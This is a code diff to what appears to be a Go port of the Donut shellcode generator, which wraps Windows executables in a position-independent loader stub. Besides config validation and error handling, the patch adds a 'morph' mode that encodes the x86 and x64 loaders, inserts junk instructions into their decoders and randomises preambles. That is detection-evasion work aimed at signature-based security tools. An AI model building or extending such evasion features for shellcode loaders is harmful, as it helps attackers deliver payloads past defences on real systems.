@@ -22,10 +22,38 @@ import (
 	try updating the stubs to latest donut first.
 */
 
+// validateConfig checks options that this Go port can actually encode in the
+// generated shellcode.  Keeping this check at the public entry points prevents
+// unsupported values from being silently copied into the module or instance.
+func validateConfig(config *DonutConfig) error {
+	switch config.Entropy {
+	case DONUT_ENTROPY_NONE, DONUT_ENTROPY_RANDOM:
+	default:
+		return fmt.Errorf("donut: unsupported entropy %d: supported values are 1 (none) and 2 (random names)", config.Entropy)
+	}
+
+	switch config.Compress {
+	case 0, 1:
+	default:
+		return fmt.Errorf("donut: unsupported compression %d: supported values are 0 or 1 (none)", config.Compress)
+	}
+
+	switch config.Format {
+	case 0, 1:
+	default:
+		return fmt.Errorf("donut: unsupported format %d: only raw output is supported (use 0 or 1)", config.Format)
+	}
+
+	return nil
+}
+
 // ShellcodeFromURL - Downloads a PE from URL, makes shellcode
 func ShellcodeFromURL(fileURL string, config *DonutConfig) (*bytes.Buffer, error) {
 	if config == nil {
 		return nil, fmt.Errorf("donut: nil config")
+	}
+	if err := validateConfig(config); err != nil {
+		return nil, err
 	}
 	buf, err := DownloadFile(fileURL)
 	if err != nil {
@@ -50,6 +78,9 @@ func DetectDotNet(filename string) (bool, string) {
 func ShellcodeFromFile(filename string, config *DonutConfig) (*bytes.Buffer, error) {
 	if config == nil {
 		return nil, fmt.Errorf("donut: nil config")
+	}
+	if err := validateConfig(config); err != nil {
+		return nil, err
 	}
 
 	switch strings.ToLower(filepath.Ext(filename)) {
@@ -93,6 +124,9 @@ func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, 
 	if config == nil {
 		return nil, fmt.Errorf("donut: nil config")
 	}
+	if err := validateConfig(config); err != nil {
+		return nil, err
+	}
 	if buf == nil {
 		return nil, fmt.Errorf("donut: nil input buffer")
 	}
@@ -118,11 +152,20 @@ func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, 
 		}
 	}
 	//ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
-	return Sandwich(config.Arch, instance)
+	return sandwich(config.Arch, instance, config.Morph)
 }
 
-// Sandwich - adds the donut prefix in the beginning (stomps DOS header), then payload, then donut stub at the end
+// Sandwich adds the canonical donut prefix and loader stub around payload.
+//
+// The public API intentionally retains its original two-argument signature.
+// Use ShellcodeFromBytes with DonutConfig.Morph to request a morphed loader.
 func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
+	return sandwich(arch, payload, false)
+}
+
+// sandwich adds the donut prefix and loader stub around payload. When morph is
+// true, the loader is encoded and surrounded by the mutation helpers.
+func sandwich(arch DonutArch, payload *bytes.Buffer, morph bool) (*bytes.Buffer, error) {
 	if payload == nil {
 		return nil, fmt.Errorf("donut: nil payload")
 	}
@@ -138,9 +181,11 @@ func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 	w := new(bytes.Buffer)
 	instanceLen := uint32(payload.Len())
 	w.WriteByte(0xE8)
-	binary.Write(w, binary.LittleEndian, instanceLen)
+	if err := binary.Write(w, binary.LittleEndian, instanceLen); err != nil {
+		return nil, fmt.Errorf("donut: write instance length: %w", err)
+	}
 	if _, err := payload.WriteTo(w); err != nil {
-		return nil, err
+		return nil, fmt.Errorf("donut: append instance payload: %w", err)
 	}
 	w.WriteByte(0x59)
 
@@ -152,29 +197,112 @@ func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 
 	switch arch {
 	case X32:
-		w.WriteByte(0x5A) // preamble: pop edx, push ecx, push edx
-		w.WriteByte(0x51)
-		w.WriteByte(0x52)
-		w.Write(LOADER_EXE_X86)
-		targetLen = int(instanceLen) + len(LOADER_EXE_X86) + 32
+		if morph {
+			preamble, err := morphPreamble(X32)
+			if err != nil {
+				return nil, fmt.Errorf("donut: create x86 morph preamble: %w", err)
+			}
+			w.Write(preamble)
+		} else {
+			w.WriteByte(0x5A) // preamble: pop edx, push ecx, push edx
+			w.WriteByte(0x51)
+			w.WriteByte(0x52)
+		}
+		if morph {
+			encoded, decoder, err := encodeLoader(LOADER_EXE_X86, false)
+			if err != nil {
+				return nil, fmt.Errorf("donut: encode x86 loader: %w", err)
+			}
+			junked, err := insertJunk(decoder)
+			if err != nil {
+				return nil, fmt.Errorf("donut: insert x86 decoder junk: %w", err)
+			}
+			w.Write(junked)
+			w.Write(encoded)
+			targetLen = int(instanceLen) + len(encoded) + len(junked) + 48
+		} else {
+			w.Write(LOADER_EXE_X86)
+			targetLen = int(instanceLen) + len(LOADER_EXE_X86) + 32
+		}
 	case X64:
-		w.Write(LOADER_EXE_X64)
-		targetLen = int(instanceLen) + len(LOADER_EXE_X64) + 6
+		if morph {
+			encoded, decoder, err := encodeLoader(LOADER_EXE_X64, true)
+			if err != nil {
+				return nil, fmt.Errorf("donut: encode x64 loader: %w", err)
+			}
+			junked, err := insertJunk(decoder)
+			if err != nil {
+				return nil, fmt.Errorf("donut: insert x64 decoder junk: %w", err)
+			}
+			w.Write(junked)
+			w.Write(encoded)
+			targetLen = int(instanceLen) + len(encoded) + len(junked) + 48
+		} else {
+			w.Write(LOADER_EXE_X64)
+			targetLen = int(instanceLen) + len(LOADER_EXE_X64) + 6
+		}
 	case X84:
-		w.WriteByte(0x31) // preamble: xor eax,eax
-		w.WriteByte(0xC0)
-		w.WriteByte(0x48) // dec ecx
+		if morph {
+			preamble, err := morphPreamble(X84)
+			if err != nil {
+				return nil, fmt.Errorf("donut: create x84 morph preamble: %w", err)
+			}
+			w.Write(preamble)
+		} else {
+			w.WriteByte(0x31) // preamble: xor eax,eax
+			w.WriteByte(0xC0)
+		}
+		w.WriteByte(0x48) // dec eax in x86; REX.W prefix in x64 branch
 		w.WriteByte(0x0F) // js dword x86_code (skips length of x64 code)
 		w.WriteByte(0x88)
-		binary.Write(w, binary.LittleEndian, uint32(len(x64Wrapper)+len(x64Core)))
-		w.Write(x64Wrapper)
-		w.Write(x64Core)
 
-		w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
-			0x51,  // push ecx
-			0x52}) // push edx
-		w.Write(LOADER_EXE_X86)
-		targetLen = int(instanceLen) + len(LOADER_EXE_X86) + len(x64Wrapper) + len(x64Core) + 32
+		if morph {
+			// Copy before appending: x64Wrapper is a slice of LOADER_EXE_X64,
+			// whose spare capacity otherwise lets append overwrite the global
+			// loader backing array.
+			x64Loader := append([]byte(nil), x64Wrapper...)
+			x64Loader = append(x64Loader, x64Core...)
+			x64Encoded, x64Decoder, err := encodeLoader(x64Loader, true)
+			if err != nil {
+				return nil, fmt.Errorf("donut: encode x64 loader for x84: %w", err)
+			}
+			x64Junked, err := insertJunk(x64Decoder)
+			if err != nil {
+				return nil, fmt.Errorf("donut: insert x64 decoder junk for x84: %w", err)
+			}
+			x64Block := append(x64Junked, x64Encoded...)
+			if err := binary.Write(w, binary.LittleEndian, uint32(len(x64Block))); err != nil {
+				return nil, fmt.Errorf("donut: write x84 x64 jump length: %w", err)
+			}
+			w.Write(x64Block)
+			x32Preamble, err := morphPreamble(X32)
+			if err != nil {
+				return nil, fmt.Errorf("donut: create x84 x86 morph preamble: %w", err)
+			}
+			w.Write(x32Preamble) // pop edx, push ecx, push edx (morphed)
+			x86Encoded, x86Decoder, err := encodeLoader(LOADER_EXE_X86, false)
+			if err != nil {
+				return nil, fmt.Errorf("donut: encode x86 loader for x84: %w", err)
+			}
+			x86Junked, err := insertJunk(x86Decoder)
+			if err != nil {
+				return nil, fmt.Errorf("donut: insert x86 decoder junk for x84: %w", err)
+			}
+			w.Write(x86Junked)
+			w.Write(x86Encoded)
+			targetLen = int(instanceLen) + len(x64Block) + len(x86Encoded) + len(x86Junked) + 48
+		} else {
+			if err := binary.Write(w, binary.LittleEndian, uint32(len(x64Wrapper)+len(x64Core))); err != nil {
+				return nil, fmt.Errorf("donut: write x84 x64 jump length: %w", err)
+			}
+			w.Write(x64Wrapper)
+			w.Write(x64Core)
+			w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
+				0x51,  // push ecx
+				0x52}) // push edx
+			w.Write(LOADER_EXE_X86)
+			targetLen = int(instanceLen) + len(LOADER_EXE_X86) + len(x64Wrapper) + len(x64Core) + 32
+		}
 	default:
 		return nil, fmt.Errorf("donut: unsupported architecture %d", arch)
 	}
@@ -194,6 +322,9 @@ func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 	if inputFile == nil {
 		return fmt.Errorf("donut: nil input buffer")
 	}
+	if err := validateConfig(config); err != nil {
+		return err
+	}
 
 	mod := new(DonutModule)
 	mod.ModType = uint32(config.Type)
@@ -209,7 +340,11 @@ func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 	if config.Type == DONUT_MODULE_NET_DLL ||
 		config.Type == DONUT_MODULE_NET_EXE {
 		if config.Domain == "" && config.Entropy != DONUT_ENTROPY_NONE { // If no domain name specified, generate a random one
-			config.Domain = RandomString(DONUT_DOMAIN_LEN)
+			domain, err := RandomStringWithError(DONUT_DOMAIN_LEN)
+			if err != nil {
+				return fmt.Errorf("donut: generate module domain: %w", err)
+			}
+			config.Domain = domain
 		} else {
 			config.Domain = "AAAAAAAA"
 		}
@@ -248,7 +383,11 @@ func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 			// and entropy is enabled
 			if config.Entropy != DONUT_ENTROPY_NONE {
 				// generate random name
-				copy(mod.Param[:], []byte(RandomString(DONUT_DOMAIN_LEN) + " ")[:])
+				randomName, err := RandomStringWithError(DONUT_DOMAIN_LEN)
+				if err != nil {
+					return fmt.Errorf("donut: generate parameter name: %w", err)
+				}
+				copy(mod.Param[:], []byte(randomName + " ")[:])
 				copy(mod.Param[DONUT_DOMAIN_LEN+1:], []byte(config.Parameters)[:])
 			} else {
 				// else set to "AAAA "
@@ -278,6 +417,9 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	}
 	if config.ModuleData == nil {
 		return nil, fmt.Errorf("donut: nil module data; call CreateModule first")
+	}
+	if err := validateConfig(config); err != nil {
+		return nil, err
 	}
 
 	inst := new(DonutInstance)
@@ -333,7 +475,10 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 		if config.Verbose {
 			log.Println("Generating random string to verify decryption")
 		}
-		sbsig := RandomString(DONUT_SIG_LEN)
+		sbsig, err := RandomStringWithError(DONUT_SIG_LEN)
+		if err != nil {
+			return nil, fmt.Errorf("donut: generate instance signature: %w", err)
+		}
 		copy(inst.Sig[:], []byte(sbsig))
 
 		if config.Verbose {
@@ -450,11 +595,15 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	// if the module will be downloaded
 	// set the URL parameter and request verb
 	if inst.Type == DONUT_INSTANCE_URL {
-		if config.ModuleName != "" {
+		if config.ModuleName == "" {
 			if config.Entropy != DONUT_ENTROPY_NONE {
 				// generate a random name for module
 				// that will be saved to disk
-				config.ModuleName = RandomString(DONUT_MAX_MODNAME)
+				moduleName, err := RandomStringWithError(DONUT_MAX_MODNAME)
+				if err != nil {
+					return nil, fmt.Errorf("donut: generate module name: %w", err)
+				}
+				config.ModuleName = moduleName
 				if config.Verbose {
 					log.Println("Generated random name for module :", config.ModuleName)
 				}
@@ -542,7 +691,7 @@ func DefaultConfig() *DonutConfig {
 		Arch:     X84,
 		Type:     DONUT_MODULE_EXE,
 		InstType: DONUT_INSTANCE_PIC,
-		Entropy:  DONUT_ENTROPY_DEFAULT,
+		Entropy:  DONUT_ENTROPY_RANDOM,
 		Compress: 1,
 		Format:   1,
 		Bypass:   3,
